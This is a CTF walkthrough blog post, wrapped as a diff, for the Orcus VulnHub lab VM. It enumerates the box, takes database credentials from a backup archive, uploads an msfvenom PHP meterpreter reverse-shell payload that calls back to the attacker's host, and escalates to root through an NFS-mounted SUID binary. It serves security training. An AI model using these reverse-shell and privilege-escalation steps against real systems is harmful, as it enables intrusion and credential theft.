@@ -1,0 +1,320 @@
+
+								
+																		Hack the Orcus VM CTF Challenge
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 26, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today again we are here with a new vulnerable hub challenge “ORCUS” design by Mr. Viper. Through this article, we are sharing our work efforts which we have utilized to complete the challenge so that we can catch the flag and beat the goal of this VM machine. This machine contains 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post-exploitation flag on the box 4. There is something on this box.
+You can download it from here.
+ Let’s Breach!!
+192.168.0.151 is the target IP now as we know that enumeration must be the first step for gathering information of any victim so therefore I had used version scan through nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -sV 192.168.0.151
+			
+				
+					
+				
+					1
+				
+						nmap -p- -sV 192.168.0.151
+					
+				
+			
+		
+
+From screenshot you can see there are so many open ports but I will go with port 80.
+
+Since port 80 was opened therefore I had explore target IP 192.168.0.151 in the browser but here I didn’t get any remarkable thing.
+
+Without wasting time I choose another tool dirb for directories brute force attack. To start brute force attack for directories open the terminal and type following:
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.0.151
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.0.151
+					
+				
+			
+		
+
+Awesome! We have stepped up in the right direction and dug out many directories but when you will see the given screenshot there I had highlighted the “backups” directories. So now I will go with backups directory.
+
+In the browser, I explored 192.168.0.151/backups as URL, where I found a tar file “simple PHP Quiz-backup.tar.gz”. Without taking more time I just download it for further enumeration.
+
+So after unzipping when I open it, I found php and html files inside it, keeping eyes on php files I choose db-conn.php for fetching more details in the hop to get something related to the database.
+
+Finally, after making many efforts I found database username and password as dbuser: dbpasswords respectively.
+
+In dirb brute force attack, we have found many directories once again if you will scroll up you will notice phpmyadmin directory in the above-given screenshot. Now again I will move towards the browser to explore 192.168.0.1.51/phpmyadmin in URL. The form is given below screenshot you can observe I had entered above username and password here.
+
+When you will give correct login credential it will allow you to login inside phpmyadmin page. From the screenshot you can see I have successfully login inside it using above credential, here I found a database “zenphoto” and decided to move inside it for further details.
+
+Now inside zenphoto, I found a setup page which will update the configuration file for the database inside web server when we will fill the information in the given text field.
+
+Here only we need to provide database username i.e. dbuser and database password i.e. dbpassword
+Without disturbing other fields click on save which will start database zenphoto installation.
+
+This will start installation when you will click on the go tab given at the end of the page. The zenphoto setup will start installing theme and plug-in for your database after that you have to set your admin user and password.
+
+A further click on the given tab I agree to these terms and condition.
+
+Now type a name for a new user as admin  and type password: password and confirm password as shown in below image and then click on the apply tab given at the top 
+
+Then login into the zenphoto database using credential as admin: password. So now we are inside admin console where we have decided to upload an image but here we upload any zip file only.
+
+Now use msfvenom to generate malicious PHP script and type following command.
+
+		
+		
+			
+			
+			
+			
+msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
+					
+				
+			
+		
+
+From the screenshot you can read the generated PHP script, at this instant we need to copy the text highlighted text further we will paste it inside text document and saved with shell.php after that create a new folder copy shell.php inside it and compress it.
+ Most important thing is to start multi handler inside Metasploit.
+
+Then come back to the Browser to upload your zip file, now browse your file and click on upload. Then explore following URL 192.168.0.151/zenphoto/albums, from the given image you can see our shell.php is successfully uploaded now click on it.
+
+When you will click on shell.php you will get meterpreter session inside Metasploit. Now type the following command in order to catch the flag.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt;cd /var/www
+meterpreter &gt;ls
+meterpreter &gt;cat flag.txt
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt;cd /var/wwwmeterpreter &gt;lsmeterpreter &gt;cat flag.txt
+					
+				
+			
+		
+
+Congrats! We have caught the 1st flag.
+
+After so many efforts I found a folder kippo then I step towards it for more information.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt;pwd
+meterpreter &gt;cd ..
+meterpreter &gt;cat /etc/kippo/data/userdb.txt
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt;pwdmeterpreter &gt;cd ..meterpreter &gt;cat /etc/kippo/data/userdb.txt
+					
+				
+			
+		
+
+ Finally! Caught 2nd flag also.
+
+Now for root privilege escalation open a text document and following: reference
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/#suid-binary
+Then save it as raj.c on the desktop.
+
+Now upload raj.c file for compiling and gain root access as shown in the following image.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt;upload /root/Desktop/raj.c .
+meterpreter &gt;shell
+gcc -o raj raj.c
+			
+				
+					
+				
+					123
+				
+						meterpreter &gt;upload /root/Desktop/raj.c .meterpreter &gt;shellgcc -o raj raj.c
+					
+				
+			
+		
+
+
+Since we know from the nmap result nfs port was open in targeted IP so taking advantage of it we will mount tmp data in URL Kali Linux. Now create a folder mount data inside it.
+
+		
+		
+			
+			
+			
+			
+mount -t nfs 192.168.0.151:/tmp mount
+chown root:root raj
+chmod u+s raj
+			
+				
+					
+				
+					123
+				
+						mount -t nfs 192.168.0.151:/tmp mountchown root:root rajchmod u+s raj
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+./raj
+id
+cd /root
+cat flag.txt
+			
+				
+					
+				
+					1234
+				
+						./rajidcd /rootcat flag.txt
+					
+				
+			
+		
+
+Great!! We have Caught 3rd flag also.
+Now try yourself to find out one more flag.
+
+Author: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
